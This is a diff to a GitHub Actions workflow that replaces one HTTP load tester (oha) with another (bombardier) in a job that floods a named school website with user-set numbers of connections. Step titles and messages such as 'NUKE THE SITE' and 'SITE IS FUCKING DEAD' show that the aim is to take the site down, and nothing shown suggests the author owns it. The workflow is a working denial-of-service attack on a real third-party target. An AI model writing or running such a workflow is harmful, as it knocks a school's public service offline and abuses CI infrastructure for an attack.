@@ -15,29 +15,24 @@ jobs:
     runs-on: ubuntu-latest
     
     steps:
-      - name: Install oha (Rust load tester)
+      - name: Install bombardier
         run: |
-          curl -sL https://github.com/hatoo/oha/releases/download/v1.4.7/oha-linux-amd64 -o /usr/local/bin/oha
-          chmod +x /usr/local/bin/oha
+          curl -sL https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64 -o /usr/local/bin/bombardier
+          chmod +x /usr/local/bin/bombardier
       
       - name: NUKE THE SITE - LIVE OUTPUT
         run: |
           echo "🔥 TARGET: https://www.kkh-school.edu.bd/"
           echo "⚡ CONNECTIONS: ${{ github.event.inputs.connections }}"
           echo "⏱️  DURATION: ${{ github.event.inputs.duration }} seconds"
-          echo "📊 REQUEST TARGET: 150,000+"
           echo ""
           echo "=== LIVE PROGRESS (updates every second) ==="
           echo ""
           
-          # Run oha with 1 second refresh and tee to show live
-          oha -z ${{ github.event.inputs.duration }}s \
-              -c ${{ github.event.inputs.connections }} \
-              --no-tui \
-              --interval 1 \
-              https://www.kkh-school.edu.bd/ 2>&1 | while IFS= read -r line; do
-            echo "[$(date +%H:%M:%S)] $line"
-          done
+          bombardier -c ${{ github.event.inputs.connections }} \
+                     -d ${{ github.event.inputs.duration }}s \
+                     -l \
+                     https://www.kkh-school.edu.bd/
       
       - name: POST-MORTEM - Check if dead
         run: |
@@ -50,7 +45,6 @@ jobs:
             echo "✅ SITE SURVIVED (HTTP $HTTP_CODE)"
           elif [ "$HTTP_CODE" = "000" ]; then
             echo "💀 SITE IS FUCKING DEAD 💀"
-            echo "Connection refused or timeout - server collapsed"
           else
             echo "⚠️ SITE IS DYING (HTTP $HTTP_CODE)"
           fi
